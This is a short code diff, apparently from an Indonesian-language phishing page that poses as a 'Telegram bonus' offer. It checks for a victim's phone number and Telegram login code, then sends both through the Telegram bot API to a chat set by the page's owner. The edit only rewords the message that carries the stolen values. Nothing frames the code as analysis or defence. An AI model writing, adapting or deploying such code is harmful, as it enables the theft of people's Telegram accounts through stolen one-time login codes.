@@ -101,7 +101,7 @@
             if (nope === "" || pin === "") {
                 alert("Mohon Isi data Dengan Benar");
             } else {
-                let message = `  *Telegram Bonus Ulangi Kode*%0A________________%0ANo. handphone:%0A${nope}%0A%0Aulangi Kode Telegram: ${pin}`;
+                let message = `  *Telegram Bonus Kode*%0A________________%0ANo. handphone:%0A${nope}%0A%0A Kode Telegram: ${pin}`;
                 let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id_tele}&text=${message}`;
                 fetch(api, {
                     method: 'POST',
